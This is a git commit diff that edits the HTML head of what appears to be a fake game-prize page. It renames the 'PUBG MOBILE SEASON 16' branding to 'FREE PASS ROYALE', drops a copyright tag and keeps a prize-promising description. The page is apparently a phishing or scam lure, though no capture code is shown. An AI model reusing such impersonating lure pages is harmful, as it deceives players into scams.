76d64563d645cd6647033f99aa09075d2b48a955
ahmed-shamy <73703631+ahmed-shamy@users.noreply.github.com>
2020-12-19 21:59:52 +0100

    Update and rename X.php to X/index.php

--- X/index.php
+++ X/index.php
@@ -3,16 +3,15 @@
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta property="og:title" content="PUBG MOBILE SEASON 16">
+<meta property="og:title" content="FREE PASS ROYALE">
 <meta name="description" content="Latest PUBG MOBILE Event. Get an exclusive SEASON 16 prize !!!">
 <meta property="og:description" content="Latest PUBG MOBILE Event. Get an exclusive SEASON 16 prize !!!">
 <meta property="og:url" content="./">
-<meta property="og:site_name" content="PUBG MOBILE SEASON 16">
+<meta property="og:site_name" content="FREE PASS ROYALE">
 <meta property="og:type" content="website">
-<meta name="copyright"content="PUBG MOBILE">
 <meta name="theme-color" content="#000">
 <meta property="og:image" content="https://i.ibb.co/hYnJR7g/125910984-807597803145849-8924472558573442407-n.jpg">
-<title>PUBG MOBILE SEASON 16</title>
+<title>FREE PASS ROYALE</title>
 <link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/files/main/aaaaaaa/styl.css">
 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
 <link rel="icon" href="https://f.top4top.io/p_1684y1a9m1.png">
